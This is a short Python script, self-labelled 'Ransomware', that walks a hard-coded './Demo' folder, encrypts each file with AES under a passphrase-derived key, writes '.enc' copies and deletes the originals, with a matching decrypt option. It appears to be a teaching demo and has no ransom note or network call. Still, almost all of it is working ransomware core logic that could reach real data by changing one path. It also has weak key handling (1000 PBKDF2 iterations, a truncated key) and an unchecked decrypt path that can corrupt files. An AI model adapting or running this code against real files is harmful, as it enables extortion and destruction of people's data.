import os
from getpass import getpass

from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes

dir_demo = "./Demo"


def generate_key(password, salt=None):
    if salt is None:
        salt = get_random_bytes(16)
    key = PBKDF2(password, salt, dkLen=32, count=1000, hmac_hash_module=SHA256)[:16]
    return key, salt


def encrypt_decrypt_directory(action, directory, password):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                if action == "encrypt":
                    key, salt = generate_key(password)
                    cipher = AES.new(key, AES.MODE_EAX)
                    with open(file_path, "rb") as f:
                        data = f.read()
                    ciphertext, tag = cipher.encrypt_and_digest(data)
                    with open(file_path + ".enc", "wb") as f:
                        f.write(salt + cipher.nonce + tag + ciphertext)
                    os.remove(file_path)
                elif action == "decrypt":
                    with open(file_path, "rb") as f:
                        salt, nonce, tag, ciphertext = f.read(16), f.read(16), f.read(16), f.read()
                    key, _ = generate_key(password, salt)
                    cipher = AES.new(key, AES.MODE_EAX, nonce)
                    data = cipher.decrypt_and_verify(ciphertext, tag)
                    with open(file_path[:-4], "wb") as f:
                        f.write(data)
                    os.remove(file_path)
            except PermissionError:
                print(f"Permission denied: {file_path}")
            except Exception as e:
                print(f"Error processing {file_path}: {e}")


def main():
    print("Ransomware")
    choice = input("1. Encrypt\n2. Decrypt\nEnter your choice: ")
    if choice in ["1", "2"]:
        password = getpass("Enter passphrase: ")
        if password:
            if choice == "1":
                encrypt_decrypt_directory('encrypt', dir_demo, password)
            elif choice == "2":
                encrypt_decrypt_directory('decrypt', dir_demo, password)
        else:
            print("No passphrase entered.")
    else:
        print("Invalid choice")


if __name__ == "__main__":
    main()
